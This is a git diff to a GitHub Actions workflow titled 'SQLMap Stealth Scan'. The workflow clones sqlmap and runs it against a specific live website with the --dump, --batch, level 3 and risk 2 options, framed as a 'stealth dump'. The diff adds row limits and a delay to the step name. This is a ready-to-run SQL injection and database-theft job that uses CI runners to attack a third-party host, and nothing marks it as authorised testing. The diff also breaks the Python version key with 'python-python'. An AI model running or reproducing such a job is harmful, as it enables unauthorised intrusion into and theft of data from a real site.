@@ -1,26 +1,26 @@
-name: Stealth SQLMap Scan
+name: SQLMap Stealth Scan
 
 on:
-  workflow_dispatch: # Cho phép bạn bấm nút chạy thủ công bất cứ lúc nào
+  workflow_dispatch:
 
 jobs:
-  stealth-scan:
+  scan:
     runs-on: ubuntu-latest
 
     steps:
-    - name: Checkout Repository
+    - name: Checkout Code
       uses: actions/checkout@v4
 
-    - name: Set up Python Environment
+    - name: Set up Python
       uses: actions/setup-python@v5
       with:
-        python-version: '3.10'
+        python-python: '3.11'
 
-    - name: Download Latest SQLMap
+    - name: Clone SQLMap
       run: |
         git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
 
-    - name: Execute Stealth Dump
+    - name: Execute Stealth Dump with 0.5s Delay
       run: |
         cd sqlmap-dev
         python3 sqlmap.py -u "https://checkccv.pro/?action=home&category=5" \
@@ -31,4 +31,6 @@ jobs:
           --level=3 \
           --risk=2 \
           --dump \
+          --start=1 \
+          --stop=10 \
           --batch
